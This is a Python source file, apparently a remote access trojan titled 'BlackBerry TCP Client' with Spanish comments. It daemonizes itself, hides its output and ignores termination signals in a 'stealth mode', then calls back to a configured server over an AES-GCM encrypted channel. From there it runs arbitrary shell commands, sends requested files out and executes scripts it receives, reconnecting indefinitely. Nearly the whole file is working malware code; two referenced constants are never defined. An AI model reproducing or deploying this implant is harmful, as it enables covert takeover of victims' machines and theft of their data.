#!/usr/bin/env python3
# BlackBerry TCP Client

import socket
import struct
import sys
import os
import time
import threading
import getpass
import subprocess
import hashlib
import signal
import atexit
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import zlib

# ==================== CONFIGURACIÓN EMBEBIDA ====================
SERVER_HOST = "localhost"
SERVER_PORT = 9949

# ==================== CONFIGURACIÓN TÉCNICA ====================
ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 9
HEARTBEAT_INTERVAL = 160
RECV_TIMEOUT = 10
AES_KEY_BYTES = 32
MAX_OUTPUT_SIZE = 1024 * 1024 * 10
CHUNK_SIZE = 64 * 1024
PUBKEY_READ_LIMIT = 8192
RECONNECT_DELAY = 30

# ==================== MODO SIGILOSO ====================
# Redirigir toda salida a /dev/null
class SilentMode:
    def write(self, x): pass
    def flush(self): pass

def enable_stealth():
    """Activa modo sigiloso total"""
    sys.stdout = SilentMode()
    sys.stderr = SilentMode()
    
    # Ignorar señales para evitar interrupciones
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    
    # Cambiar a directorio temporal
    try:
        os.chdir("/tmp")
    except:
        pass

def daemonize():
    """Convierte el proceso en daemon (Unix/Linux)"""
    try:
        # Primera bifurcación
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    
    # Desacoplar del terminal
    os.setsid()
    
    # Segunda bifurcación
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    
    # Redirigir descriptores de archivo estándar
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open(os.devnull, 'r') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdout.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stderr.fileno())

# ==================== FUNCIONES DE PROTOCOLO ====================
def verify_server_fingerprint(server_pubkey_pem):
    """Verifica fingerprint del servidor"""
    if not ENABLE_FINGERPRINT_VERIFICATION:
        return True
    
    try:
        pem_data = server_pubkey_pem if isinstance(server_pubkey_pem, bytes) else server_pubkey_pem.encode('utf-8')
        public_key = serialization.load_pem_public_key(pem_data)
        der_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        actual_fingerprint = hashlib.sha256(der_bytes).hexdigest()
        formatted_fp = ':'.join(actual_fingerprint[i:i+2] for i in range(0, len(actual_fingerprint), 2))
        return formatted_fp == EXPECTED_FINGERPRINT
    except:
        return False

def recvall(sock, n, timeout=30):
    """Recibe exactamente n bytes"""
    data = b''
    end_time = time.time() + timeout
    while len(data) < n:
        time_left = end_time - time.time()
        if time_left <= 0:
            return None
        sock.settimeout(time_left)
        try:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        except:
            return None
    return data

def send_encrypted_message(sock, plaintext, aes_key, timeout=30):
    """Envía mensaje cifrado con compresión opcional"""
    try:
        plaintext_bytes = plaintext.encode('utf-8', 'replace') if isinstance(plaintext, str) else plaintext
        
        flag = 0
        payload = plaintext_bytes
        
        if ENABLE_COMPRESSION and len(plaintext_bytes) > 100:
            try:
                compressed = zlib.compress(plaintext_bytes, level=COMPRESSION_LEVEL)
                if len(compressed) < len(plaintext_bytes):
                    payload = compressed
                    flag = 1
            except:
                pass
        
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, payload, None)
        
        message = bytes([flag]) + nonce + ciphertext
        full_packet = struct.pack('!I', len(message)) + message
        
        sock.settimeout(timeout)
        sock.sendall(full_packet)
        return True
    except:
        return False

def receive_encrypted_message(sock, aes_key, timeout=RECV_TIMEOUT):
    """Recibe y descifra mensaje"""
    try:
        raw_len = recvall(sock, 4, timeout)
        if not raw_len:
            return None, None
        
        msg_len = struct.unpack('!I', raw_len)[0]
        if msg_len > MAX_OUTPUT_SIZE:
            return None, None
        
        data = recvall(sock, msg_len, timeout=max(15, msg_len / 10000))
        if not data or len(data) < 13:
            return None, None
        
        flag, nonce, ciphertext = data[0], data[1:13], data[13:]
        aesgcm = AESGCM(aes_key)
        
        plaintext_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        
        if flag == 1:
            plaintext_bytes = zlib.decompress(plaintext_bytes)
        
        return plaintext_bytes, plaintext_bytes.decode('utf-8', 'replace')
    except:
        return None, None

def send_file_to_server(sock, aes_key, file_path):
    """Envía archivo al servidor"""
    try:
        if not os.path.isfile(file_path):
            send_encrypted_message(sock, f"[ERROR] Archivo no encontrado: {file_path}", aes_key)
            return
        
        file_size = os.path.getsize(file_path)
        sha = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()
        
        header = f"SIZE {file_size} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key):
            return
        
        with open(file_path, 'rb') as f:
            while chunk := f.read(CHUNK_SIZE):
                flag = 0
                payload_chunk = chunk
                if ENABLE_COMPRESSION:
                    try:
                        comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 1
                    except:
                        pass
                
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, payload_chunk, None)
                packet = bytes([flag]) + nonce + ct
                full_packet = struct.pack('!I', len(packet)) + packet
                sock.sendall(full_packet)
    except:
        pass

def execute_in_memory(file_bytes, file_name="<received>"):
    """Ejecuta código desde memoria"""
    ext = os.path.splitext(file_name)[1].lower()
    interpreters = {
        ".py": ["python3", "-c"],
        ".sh": ["bash", "-c"],
        ".pl": ["perl", "-e"],
        ".rb": ["ruby", "-e"]
    }
    
    interpreter_cmd = interpreters.get(ext, ["bash", "-c"])
    
    try:
        code_str = file_bytes.decode('utf-8', errors='replace')
        proc = subprocess.run(
            interpreter_cmd + [code_str],
            capture_output=True,
            timeout=60,
            text=True
        )
        out = (proc.stdout + proc.stderr).strip()
        if not out:
            out = f"[Ejecutado. Código: {proc.returncode}]"
        return True, out
    except FileNotFoundError:
        return False, f"[ERROR] Intérprete no encontrado: {interpreter_cmd[0]}"
    except:
        return False, "[ERROR] Fallo en ejecución"

def handle_incoming_file(header_msg, sock, aes_key):
    """Maneja recepción de archivo del servidor"""
    try:
        parts = header_msg.split()
        file_size, expected_hash = int(parts[1]), parts[2]
        
        file_data = b''
        sha = hashlib.sha256()
        
        while len(file_data) < file_size:
            raw_len = recvall(sock, 4, timeout=60)
            if not raw_len:
                return
            
            packet_len = struct.unpack('!I', raw_len)[0]
            packet = recvall(sock, packet_len, timeout=60)
            if not packet or len(packet) < 13:
                return
            
            flag = packet[0]
            nonce = packet[1:13]
            ct = packet[13:]
            
            aesgcm = AESGCM(aes_key)
            chunk = aesgcm.decrypt(nonce, ct, None)
            
            if flag == 1:
                chunk = zlib.decompress(chunk)
            
            file_data += chunk
            sha.update(chunk)
        
        if sha.hexdigest() != expected_hash:
            send_encrypted_message(sock, "[ERROR] Fallo de integridad", aes_key)
            return
        
        _, final_command_str = receive_encrypted_message(sock, aes_key, timeout=30)
        if not final_command_str or not final_command_str.startswith("PUT_FILE"):
            return
        
        parts = final_command_str.split()
        file_name = parts[1]
        execute = "-exc" in parts
        
        response_msg = ""
        
        if execute:
            success, out = execute_in_memory(file_data, file_name)
            if success:
                response_msg = f"[SUCCESS] '{file_name}' ejecutado:\n{out}"
            else:
                response_msg = f"[ERROR] Fallo: {out}"
        else:
            try:
                save_path = os.path.basename(file_name)
                with open(save_path, "wb") as f:
                    f.write(file_data)
                response_msg = f"[SUCCESS] Archivo '{save_path}' guardado"
            except Exception as e:
                response_msg = f"[ERROR] No se pudo guardar: {e}"
        
        send_encrypted_message(sock, response_msg, aes_key)
    except:
        pass

def process_command_and_respond(cmd, sock, aes_key):
    """Procesa comandos del servidor"""
    if not cmd:
        return
    
    output = ""
    
    if cmd.startswith("cd "):
        try:
            target_dir = cmd.split(maxsplit=1)[1]
            os.chdir(target_dir)
            output = f"Directorio cambiado a: {os.getcwd()}"
        except Exception as e:
            output = f"[ERROR] cd: {e}"
    
    elif cmd == "GET_CWD":
        output = os.getcwd()
    
    elif cmd == "whoami":
        output = getpass.getuser()
    
    elif cmd.startswith("GET_FILE "):
        file_path = cmd.split(maxsplit=1)[1]
        send_file_to_server(sock, aes_key, file_path)
        return
    
    else:
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                errors='replace'
            )
            output = (result.stdout + result.stderr).strip()
            if not output:
                output = f"[Comando ejecutado. Código: {result.returncode}]"
        except:
            output = "[ERROR] Ejecutando comando"
    
    send_encrypted_message(sock, output, aes_key)

def heartbeat_sender(sock, aes_key, stop_evt):
    """Envía heartbeats periódicos"""
    while not stop_evt.is_set():
        if not send_encrypted_message(sock, "HEARTBEAT", aes_key):
            break
        stop_evt.wait(HEARTBEAT_INTERVAL)

def run_client():
    """Bucle principal del cliente"""
    while True:
        s = None
        stop_evt = threading.Event()
        try:
            # Conexión
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((SERVER_HOST, SERVER_PORT))
            
            # Handshake
            banner = s.recv(1024)
            s.sendall(b"REQUEST_PUBKEY")
            
            pem_data = s.recv(PUBKEY_READ_LIMIT)
            if not pem_data.startswith(b'PUBKEY:'):
                raise ValueError("Respuesta inválida")
            
            server_pub_pem = pem_data[len(b'PUBKEY:'):]
            
            if not verify_server_fingerprint(server_pub_pem):
                s.close()
                time.sleep(RECONNECT_DELAY)
                continue
            
            server_pub = serialization.load_pem_public_key(server_pub_pem)
            aes_key = os.urandom(AES_KEY_BYTES)
            encrypted_aes = server_pub.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            s.sendall(struct.pack('!I', len(encrypted_aes)) + encrypted_aes)
            
            # Iniciar heartbeat
            hb_thread = threading.Thread(
                target=heartbeat_sender,
                args=(s, aes_key, stop_evt),
                daemon=True
            )
            hb_thread.start()
            
            # Bucle principal
            while True:
                _, msg_str = receive_encrypted_message(s, aes_key, timeout=(HEARTBEAT_INTERVAL + 10))
                if msg_str is None:
                    break
                
                if msg_str.startswith("SIZE "):
                    handle_incoming_file(msg_str, s, aes_key)
                elif msg_str != "HEARTBEAT_ACK":
                    process_command_and_respond(msg_str, s, aes_key)
        
        except:
            pass
        finally:
            if s:
                s.close()
            stop_evt.set()
            time.sleep(RECONNECT_DELAY)

# ==================== PUNTO DE ENTRADA ====================
if __name__ == "__main__":
    # Activar modo daemon en sistemas Unix/Linux
    if os.name == 'posix':
        daemonize()
    
    # Activar modo sigiloso
    enable_stealth()
    
    # Ejecutar cliente
    run_client()